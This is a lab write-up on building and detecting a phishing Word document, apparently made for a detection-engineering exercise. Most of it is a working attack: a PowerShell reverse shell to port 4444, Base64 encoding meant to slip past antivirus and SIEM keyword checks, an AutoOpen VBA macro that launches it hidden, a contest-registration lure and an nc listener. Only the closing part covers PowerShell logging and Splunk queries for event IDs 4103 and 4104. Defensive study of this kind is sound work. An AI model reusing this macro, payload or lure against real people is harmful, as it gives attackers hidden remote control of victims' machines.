
## Initial Access (TA0001): The Foothold of the Attack

Initial Access in MITRE ATT&CK represents the critical first step attackers take to establish a foothold within a target system or network. This initial breach serves as the foundation for subsequent malicious activities. The primary objective of Initial Access is to gain a foothold within the target system. This foothold can be a compromised user account with valid credentials, a malicious program running on a system, a vulnerability exploited to gain unauthorized access, Control over a device or server. Once established, attackers leverage this initial access for further actions like privilege escalation, lateral movement, and ultimately achieving their ultimate goals (data theft, disruption, etc.)

MITRE ATT&CK details a vast array of techniques attackers use for Initial Access. The common Technique are:
	**Social Engineering:** This leverages human psychology to trick users into compromising security. Phishing emails, malicious attachments, and social media scams are common examples.
	**Exploiting Public-Facing Applications:** Attackers target vulnerabilities in web servers, remote access applications (VPN, RDP), or other internet-facing systems to gain access.
	**Supply Chain Compromise:** Attackers target software suppliers or vendors to inject malware into their products, compromising users who install them.
	**Physical Access Attacks:** Gaining physical access to devices allows attackers to install malware or steal credentials directly.
	**Acquiring Existing Access:** Attackers might purchase access to compromised systems or user credentials on the dark web.

The method we used for initial access is `phishing` where a word document is sent to the victim which carry a macro code that execute a powershell script which open a hidden reverse shell to the attacker. In order for this macro to run the windows defender needed to be deactivated. The deactivation may seems like an unrealistic step to happen in a real environment, but the goal of the current developed detection rule is "detection" whenever an abnormal event happens, like a new vulnerability in windows or any application that will allow the execution of payload to go undetected by the windows defender. 

## Steps to create the malicious document

First you need to chose a payload. The current chosen payload is reverse shell that opens through a powershell terminal to this socket(('192.168.1.4', 4444)). The full payload is
```powershell
$command ='$client = New-Object System.Net.Sockets.TCPClient("192.168.1.5", 4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback +"PS" + (pwd).Path + ">";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

As an extra step the payload will be encoded to trick a trivial antivirus checks or SIEM rules that look for specific keywords. The steps for doing this is:
```powershell
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
Start-Process powershell.exe -ArgumentList "-NoExit", "-EncodedCommand", $encodedCommand -WindowStyle Hidden
```

The goal of the previous commands it to convert the whole command into bytes (as any cryptographic operation requires dealing with the bytes format) and then into base64 format which will looks like this

```bash
IAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAOQAyAC4AMQA2ADgALgAxAC4ANAAnACwAIAA0ADQANAA0ACkAOwAgAD0AIAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAgAD0AIAAuAFIAZQBhAGQAKAAsACAAMAAsACAALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAsADAALAAgACkAOwAgAD0AIAAoAGkAZQB4ACAAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAoAAgAD0AIAAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAApADsALgBXAHIAaQB0AGUAKAAsADAALAAuAEwAZQBuAGcAdABoACkAOwAuAEYAbAB1AHMAaAAoACkAfQA7AC4AQwBsAG8AcwBlACgAKQA=
```

Finally the `Start-Process powershell.exe -ArgumentList "-NoExit", "-EncodedCommand", $encodedCommand -WindowStyle Hidden` start the reverse shell, the argument `EncodedCommand` indicate that the payload needed to be decoded, and the `-WindowStyle Hidden` is used for creating a powershell terminal that will run in the background and not visible to the user.  

To test and verify that payload you need to open a terminal in listening mode, like this:
```
$ nc -lv 4444
```
`nc` utility is a tool network connection over sockets, the previous command was executed on a WSL. Now the `nc` will listen for any connection coming on port `4444`, I will just modify the IP in the payload to match my machine IP. After the payload is executed the powershell prompt appear on the terminal
![](01.png)

Now all we need to do is writing the macro code in the word document, also preparing a scenario for the phishing. For the phishing here is the prepared method for a word doc:

```
**Programming Contest Registration Form**

**Personal Information:**

Name: [Enter your full name]  
Age: [Enter your age]  
Gender: [Select one: Male / Female / Other]

**Contact Information:**

Email Address: [Enter your email address]  
Phone Number: [Enter your phone number]

**Academic Information:**

School/University: [Enter the name of your school/university]  
Grade/Year: [Enter your grade/year of study]

**Programming Experience:**

Have you participated in programming contests before? [Select one: Yes / No]  
If yes, please provide details: [Enter details]

**Programming Languages Proficiency:**

Please rate your proficiency in the following programming languages on a scale of 1 to 5 (1 being beginner, 5 being expert):  
- Python: [Enter rating]  
- Java: [Enter rating]  
- C++: [Enter rating]  
- Other (please specify): [Enter rating]

**Contest Preferences:**

Team Name (if applicable): [Enter your team name]  
Preferred Contest Format: [Select one: Individual / Team]

**Declaration:**

I hereby declare that all the information provided above is true and accurate to the best of my knowledge.

[Signature]: ________________________

[Date]: [Enter date]
```

Now for the macro code, to write a macro code got to `View` > `Macros` > `View Macro` and then create a new macro called `AutoOpen` and another one called `contactme`

The code of `AutoOpen` just try to make sure the function `contactme` will run automatically when the word document is opened the the enable content is done:
```vba
Sub AutoOpen()
    contactme
End Sub
```

And for the `contactme` you will provide the encrypted payload from the previous steps and then invoke that command from the powershell, here is the code

```vba
Sub contactme()
    Dim shellObject As Object
    Set shellObject = CreateObject("WScript.Shell")
    
    ' Split the encoded command into two parts
    Dim encodedCommandPart1 As String
    Dim encodedCommandPart2 As String
    
    encodedCommandPart1 = "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAyACIALAAgADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAiAFAAUwAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA"
    encodedCommandPart2 = "+ACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
    
    ' Combine the two parts
    Dim encodedCommand As String
    encodedCommand = encodedCommandPart1 & encodedCommandPart2
    
    ' Execute the PowerShell command
    
    shellObject.Run "powershell.exe  -WindowStyle Hidden -EncodedCommand " & encodedCommand

    Set shellObject = Nothing
End Sub

```

I had to divide the encoded command into two parts since a single variable can't hold the whole data.
Now are malicious document is ready and we just need to make sure there is a running `nc` that listen on the correct port of the payload.


## Preparing for the detection

First we need to enable logging of commands executed in powershell as it is by default is disabled on windows system. There is a couple of methods to do so but I will mention a single on that requires only a privileged powershell terminal on the target windows machine. 
```powershell
$scriptBlockLoggingKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
if (-not (Test-Path $scriptBlockLoggingKey)) {
    New-Item -Path $scriptBlockLoggingKey -Force
}
Set-ItemProperty -Path $scriptBlockLoggingKey -Name "EnableScriptBlockLogging" -Value 1 -Force
$moduleLoggingKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
if (-not (Test-Path $moduleLoggingKey)) {
    New-Item -Path $moduleLoggingKey -Force
}
Set-ItemProperty -Path $moduleLoggingKey -Name "EnableModuleLogging" -Value 1 -Force
$moduleNamesKey = "$moduleLoggingKey\ModuleNames"
if (-not (Test-Path $moduleNamesKey)) {
    New-Item -Path $moduleNamesKey -Force
}
New-ItemProperty -Path $moduleNamesKey -Name "*" -Value "*" -PropertyType String -Force
$transcriptionKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
if (-not (Test-Path $transcriptionKey)) {
    New-Item -Path $transcriptionKey -Force
}
Set-ItemProperty -Path $transcriptionKey -Name "EnableTranscripting" -Value 1 -Force

Set-ItemProperty -Path $transcriptionKey -Name "OutputDirectory" -Value "C:\PowerShellLogs" -Force
```

The previous code will make sure the powershell commands will be logged in the `Microsoft-Windows-PowerShell%4Operational.evtx` log file -which is an original log file in every windows system- by modifying some registry keys in a specific paths.

All is left is to make sure the log file is forwarded to the SIEM solution. In our case it really depend on how was the splunk forwarded setup, if you configured it to monitor the path `C:\Windows\System32\winevt\Logs` then the target log file will be available, otherwise you will need to modify the `etc/apps/Splunk_TA_windows/local/inputs.conf` file to include what you want.

## Constructing the detection rule

Now we have the `Microsoft-Windows-PowerShell%4Operational.evtx` log file we need to focus on the Event Id `4103` and `4104`. Where the Event ID 4103 - Module Logging captures details about the execution of commands within PowerShell modules. It provides valuable information for troubleshooting issues or monitoring PowerShell activity. It log The name of the PowerShell module being used, The specific commands executed within the module and any errors or warnings encountered during execution. While Event ID 4104 - Script Block Logging captures the entire script block executed by PowerShell. This is particularly useful for security purposes, as it allows you to see the exact commands being run, even if they are obfuscated or hidden within a larger script. And the logged info are the complete script block executed by PowerShell, Information about the user or process that ran the script and The time and date the script was executed. 

There is a couple of suggested alerts that lead to almost close results

```
* source="WinEventLog:Microsoft-Windows-PowerShell/Operational"  EventCode=4104
| rex field=Message "(?ms)^Creating Scriptblock text \(\d+ of \d+\):\s*(?<command>.*?)\s*ScriptBlock ID:.*\s*Path:.*"
| table _time ComputerName User command
| rename command as "Command"
```

```
* source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4103
| rex field=Message "(?ms)^Creating Scriptblock text \(\d+ of \d+\):\s*(?<command>.*?)\s*ScriptBlock ID:.*\s*Path:.*"
| rex field=Message "(?ms)^(?<message_content>.*?)(?=Context:)"
| table _time ComputerName User command message_content
| rename command as "Command", message_content as "Message Content"
```

Or you could use this query that try to combine them both

```
* source="WinEventLog:Microsoft-Windows-PowerShell/Operational"  (EventCode=4104 OR EventID=4104)
| rex field=Message "(?ms)^Creating Scriptblock text \(\d+ of \d+\):\s*(?<command>.*?)\s*ScriptBlock ID:.*\s*Path:.*"
| rex field=Message "(?ms)^(?<message_content>.*?)(?=Context:)"
| table _time ComputerName User command message_content
| rename command as "Command", message_content as "Message Content"
```

And save it as an alert in real time with the appropriate priority.